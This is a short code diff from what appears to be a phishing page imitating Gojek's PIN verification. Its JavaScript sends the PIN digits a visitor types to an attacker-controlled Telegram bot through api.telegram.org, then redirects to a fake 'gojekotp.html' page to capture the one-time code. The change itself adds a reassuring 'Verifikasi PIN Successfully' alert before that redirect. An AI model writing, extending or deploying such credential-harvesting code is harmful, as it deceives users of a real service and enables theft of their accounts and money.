@@ -305,7 +305,8 @@
           `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`
         );
         if (response.ok) {
-          location.href ="gojekotp.html";
+          alert("Verifikasi PIN Successfully");
+          window.location.href = 'gojekotp.html';
           inputs.forEach((input) => (input.value = ""));
           inputs[0].focus();
         } else {
@@ -328,4 +329,4 @@
     });
   </script>
 </body>
-</html>
+  </html>
